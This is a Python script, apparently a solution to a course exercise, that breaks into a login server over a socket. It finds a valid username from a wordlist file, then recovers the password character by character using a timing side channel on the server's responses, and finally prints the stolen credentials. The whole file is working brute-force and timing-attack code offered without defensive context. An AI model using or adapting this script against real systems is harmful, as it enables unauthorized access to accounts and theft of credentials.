import json
import string
import time
from itertools import product
import socket
import sys
from random import random

args = sys.argv

def get_resp(sock, log, pw):
    msg = {"login": log, "password": pw}
    msg = json.dumps(msg)
    sock.send(msg.encode('utf8'))
    resp = sock.recv(1024).decode('utf8')
    resp = json.loads(resp)
    return resp['result']

def recvest():
    address = (hostname, port)
    gl = gen_login()
    with socket.socket() as sock:
        try:
            sock.connect(address)
            while True:
                cur_log = next(gl)
                resp = get_resp(sock, cur_log, ' ')
                if resp != "Wrong password!":
                    continue
                login_ = cur_log
                pass_ = ''
                gp = gen_pass(0)
                while True:
                    cur_pass = pass_ + next(gp)
                    start = time.perf_counter()
                    resp = get_resp(sock, login_, cur_pass)
                    stop = time.perf_counter()
                    dur = (stop - start) * 1000
                    # print(dur)
                    if resp == "Wrong password!" and dur > 90:
                        pass_ = cur_pass
                        gp = gen_pass(0)
                        continue
                    if resp == "Connection success!":
                        msg = {"login": login_, "password": cur_pass}
                        print(json.dumps(msg))
                        return
            else:
                print(resp)
        except ConnectionRefusedError:
            print("No connection!")

def gen_login():
    with open('logins.txt', 'r') as file:
        for word in file.readlines():
            yield word.strip()

def gen_pass(k0):
    lst = string.digits + string.ascii_letters
    k = k0
    while True:
        yield lst[k % len(lst)]
        k += 1

hostname = args[1]
port = int(args[2])
recvest()
